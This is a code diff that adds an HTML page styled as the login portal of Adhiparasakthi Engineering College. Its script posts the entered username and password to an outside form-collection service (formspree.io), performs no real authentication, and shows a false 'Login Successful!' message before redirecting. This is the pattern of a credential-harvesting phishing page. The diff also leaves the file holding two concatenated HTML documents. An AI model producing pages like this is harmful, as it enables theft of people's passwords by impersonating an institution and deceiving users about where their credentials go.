@@ -1,6 +1,162 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adhiparasakthi Engineering College</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:#f4f4f4;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    width:420px;
+    background:#fff;
+    padding:30px;
+    border-radius:15px;
+    box-shadow:0 0 15px rgba(0,0,0,.2);
+    text-align:center;
+}
+
+.logo{
+    width:150px;
+    margin-bottom:10px;
+}
+
+h2{
+    color:#b30000;
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    margin:10px 0;
+    border:1px solid #ccc;
+    border-radius:25px;
+    font-size:16px;
+}
+
+input:focus{
+    outline:none;
+    border-color:#d32f2f;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    margin-top:15px;
+    background:#d32f2f;
+    color:#fff;
+    border:none;
+    border-radius:25px;
+    font-size:18px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#a30000;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<img src="{1BEA0FCD-48BF-4124-849C-4A3EF1914E30}.png"
+class="logo"
+alt="College Logo">
+
+<h2>Adhiparasakthi Engineering College</h2>
+
+<form id="loginForm">
+
+<input
+type="text"
+id="username"
+placeholder="Username"
+required>
+
+<input
+type="password"
+id="password"
+placeholder="Password"
+required>
+
+<input
+type="text"
+id="search"
+placeholder="Search..."
+required>
+
+<button type="submit">Login & Search</button>
+
+</form>
+
+</div>
+
+<script>
+
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+
+e.preventDefault();
+
+const username=document.getElementById("username").value;
+const password=document.getElementById("password").value;
+const search=document.getElementById("search").value;
+
+const response=await fetch("https://formspree.io/f/YOUR_FORM_ID",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json",
+"Accept":"application/json"
+},
+
+body:JSON.stringify({
+
+username:username,
+password:password,
+search:search
+
+})
+
+});
+
+if(response.ok){
+
+alert("Login Successful!");
+
+window.location.href="success.html";
+
+}else{
+
+alert("Submission Failed!");
+
+}
+
+});
+
+</script>
+
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adhiparasakthi Engineering College</title>
